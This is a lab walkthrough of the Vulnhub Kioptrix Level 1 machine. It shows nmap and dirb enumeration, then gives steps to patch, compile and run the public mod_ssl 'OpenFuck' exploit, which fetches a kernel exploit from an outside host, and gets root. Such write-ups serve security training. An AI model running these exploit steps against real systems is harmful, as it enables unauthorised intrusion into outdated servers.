---
title: "Kioptrix Level 1 Writeup"
date: 2020-03-03T15:47:35+02:00
draft: false
Tags: [
    "Writeups",
    "Vulnhub",
]
---
### This machine is from vulnhub you can download it [here](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/).
* After downloading the machine you will open the .vmx file in VMware or .vmdk with VirtualBox.

* It's a preconfigured machine it must work directly, but you may need to change the network adapter to NAT and the version to linux and kernal version you work on, then power it on ...

**have fun**... ![](/images/kioptrix1/1.png)

### 0. Getting VM's IP:
* using **Netdiscover** or **Nmap**
```java
$ nmap -sn 192.168.1.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-01 17:18 EET
Nmap scan report for 192.168.1.1
Host is up (0.0045s latency).
Nmap scan report for 192.168.1.7
Host is up (0.00016s latency).
Nmap scan report for 192.168.1.104 << kioptrix ip
Host is up (0.0033s latency).
```
### 1. Enumeration:
* #### Nmap:
  * To discover open ports and services running on our machine
```yml
$ nmap -T4 -A -v 192.168.1.104
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99)
80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp open rpcbind 2 (RPC #100000)
139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open status 1 (RPC #100024)
MAC Address: 50:3E:AA:BE:1F:AB (Tp-link Technologies)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
```
After scanning there are lots of running services:
* Apache 
* Openssh
* RPC
* Samba

### 2. Web Enumeration:
* Just apache default page.
![](/images/kioptrix1/2.png)
* tried to enumerate, if there any hidden directories:
```text
$ dirb http://192.168.1.104/ /usr/share/wordlists/dirb/common.txt

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.1.104/ ----
+ http://192.168.1.104/~operator (CODE:403|SIZE:273)
+ http://192.168.1.104/~root (CODE:403|SIZE:269)
+ http://192.168.1.104/cgi-bin/ (CODE:403|SIZE:272)
+ http://192.168.1.104/index.html (CODE:200|SIZE:2890)
==> DIRECTORY: http://192.168.1.104/manual/
==> DIRECTORY: http://192.168.1.104/mrtg/
==> DIRECTORY: http://192.168.1.104/usage/

---- Entering directory: http://192.168.1.104/manual/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
(Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.104/mrtg/ ----
+ http://192.168.1.104/mrtg/index.html (CODE:200|SIZE:17318)

---- Entering directory: http://192.168.1.104/usage/ ----
+ http://192.168.1.104/usage/index.html (CODE:200|SIZE:3704)
```
* nothing useful.                              
### Searching for exploits:
* To do so there are many ways; 
  * [Searchsploit](https://www.exploit-db.com/searchsploit) (local exploit db) 
  * [Exploit DB](https://exploit-db.com/) 
  * [Security Focus](www.securityfocus.com)
```text
# searchsploit apache mod_ssl
```
![Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Bof | exploits/unix/remote/764.c](/images/kioptrix1/3.png)
* now we got an exploit matches our version lets try it out (the 2nd one 764.c) ..

Opening the link for this exploit's author, it needs to be updated before using it:
* To deal with it open the script: ``nano /usr/share/exploitdb/exploits/unix/remote/764.c``
* First install ``libssl-dev`` >> ``$ sudo apt-get install libssl-dev``
* Add:
  * #include <openssl/rc4.h>
  * #include <openssl/md5.h> 
* search for ``wget`` and replace the link with this one : ``https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c``
* search for ``get_server_hello`` then replace it with ``const unsigned char *p, *end;``

* copy the script to desktop to run it: ``$ cp /usr/share/exploitdb/exploits/unix/remote/764.c``

* compile it: ``$ gcc -o openfuck 764.c -lcrypto``
* run it with no parameters at first: ``$ ./openfuck`` 
![As you can see the version of our running apache and the parameter we shall use ...](/images/kioptrix1/4.png)
* we will use the second one >> ``$ ./openfuck 0x6b 192.168.1.104  -c  42``
![As you can see the script worked and we got root access ...](/images/kioptrix1/5.png)

* ``$ cat  /var/mail/root``
![Got our flag#](/images/kioptrix1/6.png)
* note: we could do the same searchsploit search on Openssh and Samba..Both of them are outdated and maybe they have exploits.. but starting with apache just worked fine with me.
  * i think we could get root with samba, yeah.. try it yourself.

I hope you enjoyed ...